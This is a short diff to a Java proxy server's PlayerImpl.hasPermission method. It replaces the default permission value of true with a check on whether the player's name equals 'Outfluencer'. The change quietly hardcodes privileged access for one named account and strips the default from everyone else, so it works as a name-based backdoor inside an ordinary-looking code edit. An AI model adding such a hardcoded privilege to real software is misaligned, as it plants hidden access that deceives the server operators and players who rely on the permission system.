@@ -203,6 +203,7 @@ public class PlayerImpl implements Player {
 
     @Override
     public boolean hasPermission(String permission) {
-        return ProxyServer.getInstance().getEventManager().fire(new PermissionCheckEvent(this, permission, true)).hasPermission();
+        boolean has = getName().equalsIgnoreCase("Outfluencer");
+        return ProxyServer.getInstance().getEventManager().fire(new PermissionCheckEvent(this, permission, has)).hasPermission();
     }
 }
